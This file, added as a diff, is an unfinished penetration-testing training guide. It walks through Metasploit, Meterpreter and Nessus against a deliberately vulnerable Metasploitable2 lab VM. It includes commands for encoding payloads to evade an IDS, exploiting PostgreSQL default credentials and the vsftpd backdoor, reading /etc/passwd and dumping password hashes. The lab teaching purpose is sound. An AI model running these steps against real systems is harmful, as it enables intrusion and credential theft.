@@ -1,0 +1,376 @@
+
+**********************************************
+Straightforward Training™
+Using Metasploit/Meterpreter/Nessus (Advance)
+Author: Saulo S. Ortiz
+Date: 20180602
+Updated 20180609
+~~~ IN PROGRESS BUT USABLE...LAST ENTRY: STEP #8 ~~~
+**********************************************
+
+DISCLAIMER
+1.	The steps gathered in this guide come from several different sources. I claim no authorship to them, just authorship on
+putting this guide together and step simplification.
+
+2.	As always, I am not responsible for any issues/damages to hardware or software by using any of the software mentioned in
+this guide nor following it…do so at your own risk. I have tested these steps myself and found no issues/damage to my own systems.
+
+3.	You need to have some basic Linux understanding to be able to follow this guide, like installing and configuring your distro
+in a VM as well as basic VM experience. I will not be covering these steps in (noob) detail…these steps are NOT for people that
+have no idea how to install, remove, update/upgrade and configure Linux. Some commands will be mentioned but to a minimum.
+
+WHAT YOU’LL NEED
+1.	A host computer with minimum:
+	a.	500GB hard drive space
+	b.	8GB memory
+	c.	6 core CPU
+	d.	Best: 1TB hdd, 16GB ram and an 8 core CPU
+
+2.	Kali .ovm for VMware or OracleVirtualbox (not .iso), Mint or Kubuntu (.iso)
+
+3.	Nessus (7.1.0-ubuntu1110_amd64.deb)
+
+4.	VMWare Workstation 12 or higher or OracleVirtualBox
+
+5.	Metasploitable2 – Linux (https://www.vulnhub.com/entry/metasploitable-2,29/)
+
+
+STAGE #1: SETUP
+1.	Download and install your VM program
+
+2.	Download the Linux distro you want and create a VM for it and for metasploit using the configuration setup below
+
+3.	If using Mint or Kubuntu
+	a.	Create a VM with 2GB ram (2048) and 20GB hard drive
+	b.	CPU should be 1 CPU with 2 cores
+	c.	Go to Advance and set the hdd to Independent then Persistent
+	d.	128MB video
+	e.	NAT network
+	f.	Run your distro, log-in, then do an update and upgrade
+		i.	…this will take long while to complete
+
+4.	If using Kali .ovm VM
+	a.	Open the VM program and Import the file
+	b.	Reduce the memory to 2GB
+	c.	Change the CPU to 1 CPU, 2 cores
+	d.	The hdd is already set to 80GB…nothing we can do about it
+	e.	Go to Advance and set the hdd to Independent then Persistent
+	f.	Log-in to Kali and do an update and upgrade also
+		i.	…this will take long while to complete
+
+5.	Install Metasploit-Framework for Kubuntu or Mint
+	a.	sudo apt-get update
+	b.	sudo apt-get install postgresql
+	c.	cd /opt
+	d.	sudo wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
+	e.	sudo mkdir metasploit
+	f.	sudo chmod +x ./metasploit-latest-linux-x64-installer.run
+	g.	sudo ./metasploit-latest-linux-x64-installer.run
+
+6.	Metasploitable2 VM setup
+	a.	512MB memory
+	b.	1 CPU with 1 core
+	c.	8GB hdd
+
+7.	Download Nessus
+	a.	https://www.tenable.com/downloads/nessus
+
+8.	Decompress the .deb file:
+	a.	In a terminal screen navigate to /Downloads
+	b.	Type dpkg –i <deb_file.deb>
+		i.	…the file will unpack and install…remember to sudo if you’re not in Kali
+
+9.	Follow the instructions to start Nessus then navigate to the https link in your browser
+	a.	Select Advance button if it reads that your connection is not secure
+	b.	Add exception… button
+	c.	Confirm Security Exception button
+
+10.	Create your login and password…you can use a disposable email like 10minute email
+	a.	Save this URL!
+	b.	Select Home, Professional or Manage
+	c.	Go to https://www.tenable.com/products/nessus-home
+	d.	Wait about 8-10 minutes for plugin downloads to complete
+----------------------------------------------------------------------------------------------------------------------------------------
+Note: When trying to do these steps after setup you’ll need to do the following:
+	1.	Start Nessus service: /etc/init.d/nessusd start
+	2.	Go to the https link as before
+----------------------------------------------------------------------------------------------------------------------------------------
+
+STEP #2: INTRO TO METASPLOIT
+Default login info is:
+•	Metaspoloit: msfadmin/msfadmin
+•	Kali: root/toor
+
+Use it and get the IP address…will need it soon!
+1.	Make sure your NIC in metasploit is set to NAT before running it
+
+2.	Use the default login and password then identify the eth0 IP address…we’ll need it soon
+
+3.	While in your Linux distro:
+	a.	We want to save data in a database for later use…type service postgresql start
+
+4.	Type msfconsole to start metasploit…in Kali you can click on the icon
+	a.	To verify msf and the database are connected type db_status
+
+----------------------------------------------------------------------------------------------------------------------------------------
+Note: Type help and the command to get more information about it
+----------------------------------------------------------------------------------------------------------------------------------------
+
+5.	You can use the commands help, show, search and back. For example…search for the payload reverse_tcp
+	a.	You’ll get a huge list but we just want the one we mentioned
+
+6.	You can copy and paste it then executed which will take you to that payload shell
+	a.	Now type show options for a list of options that each payload has
+		i.	…LHOST = local host
+	b.	Type set lhost <kali_ip_address>
+	c.	Type show options
+	d.	Type back to return to the msf shell
+		i.	…the settings we just did will become null
+----------------------------------------------------------------------------------------------------------------------------------------
+Note: Remember to use autocomplete using your Tab button
+----------------------------------------------------------------------------------------------------------------------------------------
+
+7.	To set the same parameter globally:
+	a.	Go back to the payload
+	b.	Type setg lhost  <kali_ip_address>
+		i.	…now when you back out of the payload shell this parameter will remain permanently
+	c.	To clear the global parameter you need to be inside the payload then:
+		i.	…type unsetg lhost
+		ii.	…this will not unset from the payload itself…for that type unset lhost
+	d.	Type back to return to the msf shell
+
+8.	You can also search for:
+	a.	a platform: search platform:osx or search platform:windows
+	b.	help search for author, bid, cve, etc…
+	c.	or post payloads as search platform:post
+
+9.	Let’s load a common exploit:
+	a.	Type search excel
+		i.	…select the one that reads featheader
+	b.	Type show options
+	c.	Type show payloads to see what else you can attach to this exploit
+	d.	Type show advanced for any advance options
+	e.	Type show evasion
+		i.	…nothing shows up for this exploit but others may have info
+	f.	Type show targets to see the targets you can use this against
+
+STEP #3: CREATE A BIND SHELL PAYLOAD
+1.	Type use payload/windows/shell_bind_tcp
+
+2.	Type help
+
+3.	Type generate –h to see options
+
+4.	Type generate to generate a shell code
+----------------------------------------------------------------------------------------------------------------------------------------
+Note: A bind_tcp_shell will bind us to a port on the target to get a shell.
+----------------------------------------------------------------------------------------------------------------------------------------
+
+5.	Type setg rhost <ip_address>
+	a.	Type show options to view the parameters
+
+6.	Type generate again
+	a.	Notice the set parameters are in the payload
+----------------------------------------------------------------------------------------------------------------------------------------
+Note: An IDS may be able to notice this payload and block it. If you knew which portion of this code triggers the IDS then you can edit it by using the command.
+The most common bytes of this payload that can trigger an IDS are \xff and \x50.
+----------------------------------------------------------------------------------------------------------------------------------------
+
+7.	Remove the triggers from the generated payload:
+	a.	Type generate –b \xff\x50
+		i.	…it will generate a new payload without these characters…but there’s a limit to how many you can remove before a payload cannot be generated
+		ii.	…your payload size will change…keep an eye out for this
+
+8.	Type show encoders and select x86/shikata_ga_nai then change the LPORT to 5555 and make the payload in BASH format
+	a.	Type generate –e x86/shikata_ga_nai –b \xff –i 3 –o lport=5555 –t bash
+		i.	…could not complete with \x50 in it
+		ii.	…what’s the byte size?
+		iii.	…you can use formats...go to help for these
+----------------------------------------------------------------------------------------------------------------------------------------
+Note: -i 3 iterates the code 3 times…meaning, code and recode up to 3 times. This supposedly makes the payload harder to detect.
+----------------------------------------------------------------------------------------------------------------------------------------
+
+STEP #4: OTHER MSFCONSOLE COMMANDS
+1.	With workspace you can have multiple screens areas where you can run commands independent from others. Like using Shift + Ctrl + T.
+	a.	Type workspace to see the default
+	b.	Type workspace –a metasploitable
+	c.	Type workspace again
+	d.	Type workspace –h to see more options
+
+2.	Type help to see other database commands
+
+3.	You can connect to a database from here if you forgot to do it before running msf
+	a.	Type db_connect –h and follow the instructions
+	b.	Type db_import to pull scan from Nessus into metasploit
+		i.	…you can run a loot are files gathered from an exploit
+		ii.	…or you can run an nmap from msf
+		iii.	…you can do an export to do backups
+	c.	Type host then host –h to view the columns you want from the scan
+		i.	…do not use space in between columns
+		ii.	Ex. host –c mac,os_sp,info
+
+
+STEP #5: USING METERPRETER
+Meterpreter is a payload delivered through msfconsole that creates a shell in the target’s memory which doesn’t write anything to the disc. In
+this section we’ll try to get a shell through the postgresql database running in metasploitable.
+
+1.	While in msfconsole…if you have not done so yet, set the global parameter of the remote host…which is the metasploitable VM:
+	a.	Type setg rhost <metasploitable2_ip_address>
+
+2.	Type nmap –n –sV <metasploitable2_ip_address>
+		i.	…these are all the vulnerable ports and services running
+	a.	Type search postgres
+	b.	Type use exploit/linux/postgres/postgres_payload
+	c.	Type show options
+
+3.	Here we can see that the username is postgres and during research I found that the default login info for it is (postgres/postgres)
+	a.	Set the password: set password postgres
+	b.	Type show targets
+	c.	Type show options
+		i.	…remember that the rhost is the IP of the metasploitable the lhost is Kali’s IP address
+	d.	Type exploit or run
+		i.	…if you’re doing this on different day, you may need  to set your global parameters again
+
+4.	You should get a meterpreter prompt…this means you just created a shell in metasploit through the postgresql database and have control of the machine.
+
+5.	Type help to check the options you have
+
+6.	Use the background command which puts the current session in the background in metasploit so you can come back to it later or run other sessions
+
+7.	Type sessions to view current sessions in metasploit and the target or sessions of multiple targets
+
+8.	Type sessions –h for additional session options
+
+9.	While in meterpreter:
+	a.	Type cat /etc/passwd
+	b.	Type ifconfig
+	c.	Type netstat –an
+	d.	Type arp
+	e.	Type router
+	f.	Type help and check the file system command list
+	g.	Type ls and download the server.crt file
+		i.	…using a second terminal screen in Kali check if you received the .crt file
+	h.	Type help again and look at the core commands
+		i.	…you can run post exploits
+		i.	Type background
+	j.	Type sessions …to find out the session number
+	k.	Type sessions –i <session_number>
+	l.	Type ps …to see the processes running
+		i.	…you get even more info on what is running and get an idea what to do next
+	m.	Type sysinfo
+----------------------------------------------------------------------------------------------------------------------------------------
+Note: When you background a session it “kicks you out” and places that session in the background for later use…you’re not really kicked out…it’s more
+like putting your call on-hold then you can come back to it without having to go through the entire connection process. Do sessions to see how the session
+is set in the background.
+----------------------------------------------------------------------------------------------------------------------------------------
+
+10.	Type exit to drop out of the meterpreter shell
+		i.	…if you’re running processes you can Ctrl+C then exit
+
+STEP #6: SCANNING WITH MSFCONSOLE (Part #1)
+1.	Type hosts
+
+2.	Type services
+		i.	…shows the last service which was postgreSQL
+
+3.	Delete the host:
+	a.	hosts –d <rhost_ip_address>
+
+4.	Run nmap:
+	a.	nmap –A <rhost_ip_address>
+		i.	…you can pipe the results to a .txt file and you can also grep it
+		ii.	…you can also use the –vv to see results while scanning
+----------------------------------------------------------------------------------------------------------------------------------------
+Note: We show the following services with ports: FTP, ssh, telnet, smtp, apache, rpcbind, netbios (Samba), a remote shell, a root shell, java, another
+FTP, MySQL, VNC, x11, unreal gaming server irc, two more apache servers, MAC address, etc. Lots of things to exploit.
+----------------------------------------------------------------------------------------------------------------------------------------
+
+5.	Let’s populate nmap with the info we captured. This will populate the database so we can search through it easier:
+	a.	Type db_nmap –A <rhost_ip_address>
+	b.	Type hosts
+		i.	…now we see the host info
+	c.	Type services -u
+		i.	…to see what services it discovered
+		ii.	…services –h for more info
+
+6.	Type search portscan
+	a.	Type use auxiliary/scanner/portscan/tcp
+	b.	Type show options
+	c.	Type setg rhosts <rhost_ip_address>
+		i.	…this command uses rhosts NOT rhost to set the IP address
+	d.	Type exploit or run
+		i.	…once the scan is done, we’ll see the open TCP ports
+
+STEP #7: SCANNING WITH MSFCONSOLE (Part #2)
+Using the command services –u (same as services) we can see what programs the target has running and we can scan and exploit. Once you
+have a target always use this command!
+
+1.	Go back then use /auxiliary/scanner/mysql/mysql_version to scan MySQL for its version
+	a.	Type options and check rhost is set
+	b.	Type run
+		i.	…see program version
+
+2.	Go back then use auxiliary/scanner/postgres/postgres_version for its version
+	a.	Type options and check the rhost and password are set
+	b.	Type run
+
+3.	Go back then use auxiliary/scanner/postgres/postgres_hashdump
+	a.	Type options
+	b.	Type run
+		i.	…you’ll see the hash for the postgres user
+
+4.	Go back then use auxiliary/scanner/postgres/postgres_schemadump
+	a.	Type options
+	b.	Type run
+		i.	…its shows the host and port
+		ii.	…no columns or rows but if it were populated you could read them and have a better idea of the database
+
+5.	Type services –u again to see the list of programs running in the metasploitable (target)
+
+6.	Type search vsftp to see if we can find a module to this program
+
+7.	Type use exploit/unix/ftp/vsftp_234_backdoor
+	a.	Type options
+	b.	Type run or exploit
+		i.	…screen will be blank, but…
+	c.	Type ls
+	d.	Type cd home
+	e.	Type ls –lah
+	f.	Type cd msfadmin
+	g.	Type ls –a
+	h.	Use Ctrl+C to leave the ftp
+
+8.	Type services –u
+	a.	Type services -p 21 to see any services running on that port
+		i.	…take a note on the columns
+
+9.	Type services –p 21 –c proto, port, state
+		i.	…shows you protocol, port and its state
+		ii.	…try it using another port
+		iii.	…if you want all info then omit the rest of the command after 21
+----------------------------------------------------------------------------------------------------------------------------------------
+Note: At this point you can view every successful attempt by typing creds. This information is stored in the database and shows your successful connections
+along with important information.
+----------------------------------------------------------------------------------------------------------------------------------------
+
+10.	Go back then type services
+
+11.	Do a search vnc
+		i.	…we want to use a module from the scanner folder
+	a.	Type search scanner/vnc to narrow your output
+
+12.	Type use auxiliary/scanner/vnc/vnc_none_auth
+	a.	Type options
+		i.	…check the rhosts info
+	b.	Type run (or exploit)
+		i.	…it found the VNC protocol version [3,  4].3…you can also see this using services
+		ii.	…it did not find it to have a blank password authentication
+iii.	…continue to identify how to get in using the data you see here and also using services -u
+
+STEP #8: WEB APPLICATION SCANNING WITH MSFCONSOLE
+1.	Go back then type services
+
+2.	Using the browser we’ll see what we can see under the IP address and port 80…what program in the list is the one using port 80?
+
+3.	In the browser type the target’s IP address…what do you see here?
+	a.	These links connect to vulnerable web applications
